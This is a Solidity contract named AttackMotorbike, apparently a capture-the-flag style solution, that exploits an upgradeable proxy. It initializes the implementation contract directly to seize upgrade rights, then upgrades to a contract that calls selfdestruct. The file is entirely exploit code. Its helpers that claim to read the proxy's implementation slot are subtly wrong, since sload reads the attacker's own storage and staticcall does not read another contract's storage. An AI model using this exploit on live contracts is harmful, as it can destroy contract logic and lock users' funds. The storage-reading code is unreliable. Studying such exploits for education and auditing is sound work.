// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface IEngine {
    function initialize() external;
    function upgradeToAndCall(address newImplementation, bytes memory data) external payable;
    function upgrader() external view returns (address);
}

contract AttackMotorbike {
    address public target;
    
    constructor(address _target) public {
        target = _target;
    }
    
    function attack() external {
        // First, find the implementation address by reading storage
        bytes32 implSlot = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
        address implementation;
        
        assembly {
            implementation := sload(implSlot)
        }
        
        // If we can't read it from our storage, we need to read from the proxy
        if (implementation == address(0)) {
            implementation = getImplementationFromProxy(target);
        }
        
        // Initialize the Engine contract directly to become the upgrader
        IEngine(implementation).initialize();
        
        // Create a self-destruct contract
        SelfDestruct sd = new SelfDestruct();
        
        // Upgrade to the self-destruct contract and call its destroy function
        IEngine(implementation).upgradeToAndCall(
            address(sd),
            abi.encodeWithSignature("destroy()")
        );
    }
    
    function getImplementationFromProxy(address proxy) internal view returns (address) {
        // Read storage slot from proxy contract
        bytes32 implSlot = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
        bytes32 value;
        
        assembly {
            // Get the value from proxy's storage
            let ptr := mload(0x40)
            mstore(ptr, implSlot)
            let success := staticcall(gas(), proxy, ptr, 0x20, ptr, 0x20)
            value := mload(ptr)
        }
        
        return address(uint256(value));
    }
    
    function readProxyStorage() external view returns (address) {
        bytes32 implSlot = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
        bytes32 value;
        
        assembly {
            let ptr := mload(0x40)
            mstore(ptr, implSlot)
            mstore(add(ptr, 0x20), 0)
            
            let success := staticcall(
                gas(),
                target,
                add(ptr, 0x1c),
                0x04,
                ptr,
                0x20
            )
            
            if success {
                value := mload(ptr)
            }
        }
        
        return address(uint256(value));
    }
}

contract SelfDestruct {
    function destroy() external {
        selfdestruct(address(0));
    }
}